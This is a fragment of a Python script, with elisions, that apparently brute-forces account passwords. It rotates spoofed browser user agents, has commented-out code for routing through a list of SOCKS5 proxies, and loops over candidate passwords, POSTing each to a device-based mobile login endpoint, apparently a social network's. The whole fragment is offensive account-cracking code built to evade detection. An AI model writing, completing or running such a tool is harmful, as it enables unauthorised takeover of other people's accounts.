...
#	xx = open('.proxy.txt','r').read().splitlines()
	ua = random.choice(["Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5127.98 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5013.187 Safari/537.36",
	"Mozilla/5.0 (Windows NT 11.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4990.163 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/101.0.5025.161 Chrome/101.0.5025.161 Safari/537.36"])
	#(redmi)
#	proxy = {'http': 'socks5://'+random.choice(xx)}
	...
	for pw in pwx:
		try:
			...
			bx = ses.post(f'https://{url}/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl', data=date, headers=hd2)
